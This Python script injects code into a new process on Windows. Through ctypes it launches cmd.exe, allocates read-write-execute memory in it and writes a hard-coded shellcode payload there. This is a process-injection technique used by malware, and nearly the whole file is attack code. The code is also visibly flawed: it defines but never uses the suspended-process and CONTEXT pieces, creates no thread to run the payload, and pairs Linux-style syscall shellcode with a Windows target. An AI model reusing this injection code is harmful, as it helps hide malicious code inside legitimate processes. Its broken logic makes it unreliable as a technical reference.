import ctypes
import sys
import os

def inject_payload_into_process(payload: bytes, exe_path: str) -> None:

    BYTE      = ctypes.c_ubyte
    WORD      = ctypes.c_ushort
    DWORD     = ctypes.c_uint32
    LPSTR 	  = ctypes.c_char_p 
    HANDLE    = ctypes.c_void_p

    CREATE_SUSPENDED = 0x0004
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40

    class PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [
        ('hProcess', HANDLE), 
        ('hThread', HANDLE), 
        ('dwProcessId', DWORD), 
        ('dwThreadId', DWORD),
        ]
        
    class STARTUPINFO(ctypes.Structure):
        _fields_ = [
        ('cb', DWORD), 
        ('lpReserved', LPSTR),    
        ('lpDesktop', LPSTR),
        ('lpTitle', LPSTR),
        ('dwX', DWORD),
        ('dwY', DWORD),
        ('dwXSize', DWORD),
        ('dwYSize', DWORD),
        ('dwXCountChars', DWORD),
        ('dwYCountChars', DWORD),
        ('dwFillAttribute', DWORD),
        ('dwFlags', DWORD),
        ('wShowWindow', WORD),
        ('cbReserved2', WORD),
        ('lpReserved2', DWORD),    
        ('hStdInput', HANDLE),
        ('hStdOutput', HANDLE),
        ('hStdError', HANDLE),
        ]

    class FLOATING_SAVE_AREA(ctypes.Structure):
        _fields_ = [
        ("ControlWord", DWORD),
        ("StatusWord", DWORD),
        ("TagWord", DWORD),
        ("ErrorOffset", DWORD),
        ("ErrorSelector", DWORD),
        ("DataOffset", DWORD),
        ("DataSelector", DWORD),
        ("RegisterArea", BYTE * 80),
        ("Cr0NpxState", DWORD),
        ]	
        
    class CONTEXT(ctypes.Structure):
        _fields_ = [
            ("ContextFlags", DWORD),
            ("Dr0", ctypes.c_uint64),  # changed from DWORD
            ("Dr1", ctypes.c_uint64),  # changed from DWORD
            ("Dr2", ctypes.c_uint64),  # changed from DWORD
            ("Dr3", ctypes.c_uint64),  # changed from DWORD
            ("Dr6", ctypes.c_uint64),  # changed from DWORD
            ("Dr7", ctypes.c_uint64),  # changed from DWORD
            ("FloatSave", FLOATING_SAVE_AREA),
            ("SegGs", ctypes.c_uint64),  # changed from DWORD
            ("SegFs", ctypes.c_uint64),  # changed from DWORD
            ("SegEs", ctypes.c_uint64),  # changed from DWORD
            ("SegDs", ctypes.c_uint64),  # changed from DWORD
            ("Rdi", ctypes.c_uint64),  # changed from DWORD
            ("Rsi", ctypes.c_uint64),  # changed from DWORD
            ("Rbx", ctypes.c_uint64),  # changed from DWORD
            ("Rdx", ctypes.c_uint64),  # changed from DWORD
            ("Rcx", ctypes.c_uint64),  # changed from DWORD
            ("Rax", ctypes.c_uint64),
            ("Rbp", ctypes.c_uint64),  # changed from DWORD
            ("Rip", ctypes.c_uint64),  # changed from DWORD
            ("SegCs", ctypes.c_uint64),  # changed from DWORD
            ("EFlags", DWORD),
            ("Rsp", ctypes.c_uint64),  # changed from DWORD
            ("SegSs", ctypes.c_uint64),  # changed from DWORD
            ("ExtendedRegisters", BYTE * 80),
        ]

    # Constants from Windows API
    PAGE_READWRITE = 0x04
    PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
    VIRTUAL_MEM = (0x1000 | 0x2000)

    # Load kernel32.dll
    kernel32 = ctypes.windll.kernel32

    # STARTUPINFO and PROCESS_INFORMATION structures
    startupinfo = STARTUPINFO()
    startupinfo.cb = ctypes.sizeof(startupinfo)
    process_information = PROCESS_INFORMATION()


    # Create a new process
    if not kernel32.CreateProcessW(None, exe_path, None, None, False, 0, None, None, ctypes.byref(startupinfo), ctypes.byref(process_information)):
        print("\n[!] Error occurred while creating process:")
        print("\tError Code: {:d}".format(kernel32.GetLastError()))
        sys.exit(1)

    print("[+] Process created successfully. PID:", process_information.dwProcessId)


    def print_error():
        # Retrieves the calling thread's last-error code value.
        error = kernel32.GetLastError()
        # Retrieves the system error message for the specified error code.
        message = ctypes.create_unicode_buffer(256)
        kernel32.FormatMessageW(0x10000, None, error, 0, message, 256, None)
        print(f'Error code: {error}, Message: {message.value}')


    # Allocate memory in the new process
    size = 4096  # Allocate a full memory page
    addr = kernel32.VirtualAllocEx(process_information.hProcess, 0, size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
    print("addr: ", addr)


    if not addr:
        print("\n[!] Error occurred while allocating memory:")
        print_error()
        sys.exit(1)

    print("[+] Memory allocated successfully.")


    # Check if the process is still running
    exit_code = DWORD()
    if not kernel32.GetExitCodeProcess(process_information.hProcess, ctypes.byref(exit_code)):
        print("\n[!] Error occurred while getting process exit code:")
        print_error()
        sys.exit(1)


    if exit_code.value == 259:  # STILL_ACTIVE
        print("[+] Process is still running.")
    else:
        print(f"\n[!] Process has exited with code {exit_code.value}.")
        sys.exit(1)

    # Write the payload to the allocated memory
    written = ctypes.c_size_t(0)  # This will store the number of bytes actually written
    payload_p = ctypes.create_string_buffer(payload)  # Create a buffer from the payload
    if not kernel32.WriteProcessMemory(process_information.hProcess, addr, payload_p, len(payload), ctypes.byref(written)):
        print("\n[!] Error occurred while writing payload to memory:")
        print_error()
        sys.exit(1)




    print("[+] Payload injected successfully.")


# Usage
# input_file = sys.argv[1]
# with open(input_file, 'rb') as f:
#     data = f.read()
# payload = data
payload = b'\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xc0\x50\x48\xbb\x2f\x63\x61\x6c\x63\x2e\x65\x78\x65\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05'
print("payload size: ", len(payload))
# exe_path = u"C:\\Windows\\explorer.exe"
exe_path = u"C:\\Windows\\System32\\cmd.exe"

inject_payload_into_process(payload, exe_path)